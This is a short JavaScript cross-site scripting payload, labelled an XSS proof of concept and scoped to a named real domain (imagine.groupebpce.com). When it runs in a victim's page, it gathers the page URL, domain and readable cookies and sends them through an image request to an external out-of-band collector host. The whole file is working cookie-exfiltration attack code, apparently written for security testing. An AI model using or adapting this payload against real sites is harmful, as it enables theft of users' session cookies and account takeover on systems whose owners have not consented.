
(() => {
  if (!/\.?imagine\.groupebpce\.com$/.test(location.hostname)) return;

  // Evidence in the UI (optional)
  console.log("[XSS PoC] Executed on", location.href);

  // Build payload. Note: HttpOnly cookies will NOT appear here (by design).
  const payload = {
    url: location.href,
    domain: document.domain,
    cookies: document.cookie // may be empty or partial if HttpOnly is used
  };

  // Send to your collector without CORS issues.
  const q = encodeURIComponent(JSON.stringify(payload));
  new Image().src = "https://d2s3r4mth8rhgt5fbi50garw8bcd5f1k6.oast.live/xss?p=" + q;
})();
